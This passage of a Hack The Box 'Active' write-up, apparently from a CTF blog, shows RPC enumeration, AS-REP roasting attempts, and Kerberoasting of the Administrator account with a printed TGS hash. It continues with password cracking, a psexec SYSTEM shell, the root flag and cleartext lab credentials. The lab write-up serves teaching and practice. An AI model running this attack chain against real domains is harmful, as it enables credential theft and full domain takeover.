+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s2">"SVC_TGS%GPPstillStandingStrong2k18"</span> 10.10.10.100
+rpcclient <span class="nv">$&gt;</span> querydispinfo
+index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>administering the computer/domain
+index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>guest access to the computer/domain
+index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Key Distribution Center Service Account
+index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: <span class="o">(</span>null<span class="o">)</span>
+rpcclient <span class="nv">$&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Create a file.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /bin/cat users.txt
+SVC_TGS
+</code></pre></div></div>
+
+<h2 id="as-rep-roasting">AS-REP Roasting</h2>
+
+<ul>
+  <li>To do this your clock has to be synchronized with the dc clock, if you ever have to do it you can use this command.</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">ntpdate 10.10.10.100</code></p>
+
+<ul>
+  <li>
+    <p>We could do this if we do not have credentials but since we have the password it was not necessary but if we did not have it we could have requested a ticket but it is not possible.</p>
+  </li>
+  <li>
+    <p>Here you have a link where they explain it very well.</p>
+  </li>
+  <li>
+    <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/</a></p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetNPUsers.py active.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span>-] User SVC_TGS doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre></div></div>
+
+<ul>
+  <li>
+    <p>The port 88 is open so we can use kerbrute as well.</p>
+  </li>
+  <li>
+    <p><a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./kerbrute_linux_amd64
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 01/28/23 - Ronnie Flathers @ropnop
+
+This tool is designed to assist <span class="k">in </span>quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
+It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
+Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts
+
+Usage:
+  kerbrute <span class="o">[</span><span class="nb">command</span><span class="o">]</span>
+
+Available Commands:
+  bruteforce    Bruteforce username:password combos, from a file or stdin
+  bruteuser     Bruteforce a single user<span class="s1">'s password from a wordlist
+  help          Help about any command
+  passwordspray Test a single password against a list of users
+  userenum      Enumerate valid domain usernames via Kerberos
+  version       Display version info and quit
+
+Flags:
+      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
+      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
+  -d, --domain string   The full domain to use (e.g. contoso.com)
+  -h, --help            help for kerbrute
+  -o, --output string   File to write logs to. Optional.
+      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
+  -t, --threads int     Threads to use (default 10)
+  -v, --verbose         Log failures and errors
+
+Use "kerbrute [command] --help" for more information about a command.
+</span></code></pre></div></div>
+
+<ul>
+  <li>We can obtain a ticket for the administrator user.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
+active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 14:06:40.351723  2023-01-28 17:14:29.170938
+</code></pre></div></div>
+
+<ul>
+  <li>We have the admin user hash, let’s crack it.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 <span class="nt">-request</span>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
+active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 14:06:40.351723  2023-01-28 17:14:29.170938             
+
+
+
+<span class="o">[</span>-] CCache file is not found. Skipping...
+<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator<span class="k">*</span><span class="nv">$4e5088992b25d09403d37d2e9ef6e72a$8c895d03044c58eb7c992d6c70f3ab24ae8c6716a2cdae892b7cbc67ba09818f3f5a04b8f0e37ffd45cc6455b2ac76ac7d50fc53df376ee22d951c44e997ab8ae4f139753e74d224d95c01d3fad9788e0a1a9413ad3782ae99921e681c6400e71a786082ec52549c445f7fbc352f12650a909f01f8d0f9a7e1da875ed9521df6643c80fb2454123e58caf3113ee8cae08b9ee296de7beccb621c3d3905908291faa105879c4f13b9c3e2598e3a4631c25a6d302a6a4b07f6de66d2cfba70cdba9b194889283cde2ee9dae39b9f22c94e07e3aca3f155c37b08278c02a32b75b96cbc3abf08f86a65b22f08c56d17e86faf42ecaf06a17f8f30c34ccdac2fafe6956f852cb07a6aa8297bd34d491b2c94f3180d68d3b0753a69e6a9e3be6f4afd99f6119c4c594456bbe92ca29796ce6b3b5ce23ed6c6718411301dc2feb0ab6f43059cdc09149f22c2ccc183554dc527329a6ecc3fa3024da5b95cbf9df28c6cd02221c99719446f6a78d56a9424eb642221d57df9cea4ddd251a576a1bc352d5ef78a617cd9e26d7fcaec60839a21555be11429568f5e6c1baa5eb8a7ad3cec87d51e0ac3485e8b721377b2f3e12a52e953fb27d4b94b6a5c73452d6ae6b0b5d4d8730114a5aff717f386663eb10d39451097ea081f42595fa0dd1e2aefe2bf08e5884f5615ede70728c6c1bb33fbb39e4bcfba746bf760f16f14ef60162b83c7f835a46fb61b9e73ed119e46ae1753e9c11414d4f20fef2527e2ca6fa95889c1f4d6ff3de678455db626f0dead28d9d0cdf566074e3fd03378283bcb3a0148f997f2f63c53113d700ef7c6d2613d62a16ecd4145aec9eb40a948f1b98c161657b2a114e550e3ee277906f8458d160b2ea3fbdf17eff96b2ca126f7850feaa0885d4f1518a43478ded45b70f40bae58349147681457d22b4cd5aeaaf32632df697914ec300daec74c8d9dbbcc25581c9b2c795598b1a9a34a17a6f8f835413fbd6ca1173935ccd4242c4fa7cf9e90630646cff5ab81cadb0d63259cb471e0e296a96b6461c120efcdfa22e93654cbe537f1b98be8b27c046343263b7335434b8bfb852e8ea1cf760945df81b1701632f8fa2c1da5721cf17e159dd03aa9b55d8a605fb907a341e361280950fa58a1015e4bb5668721cd2259a69dcbd7ab3c0bfcf92cab7a81f85f5bb67125f046ec6bc63d30741cde6792e165ecae26c8eb8ae29ee490b3b0100c98282b6c90ad39ed7783607916c344406667</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+Ticketmaster1968 <span class="o">(</span>?<span class="o">)</span>
+1g 0:00:00:26 DONE <span class="o">(</span>2023-01-28 18:58<span class="o">)</span> 0.03752g/s 395402p/s 395402c/s 395402C/s Tiffani1432..Tiago_18
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<ul>
+  <li>The password is correct.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'Ticketmaster1968'</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\A</span>dministrator:Ticketmaster1968 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Now we can have a shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.100.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file AteihbIx.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.100.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service nMsa on 10.10.10.100.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service nMsa.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 6.1.7601]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">hostname
+</span>DC
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
+385fab9ee1161ce755cbbffe84ed6701
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/easy/2024/04/15/active.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
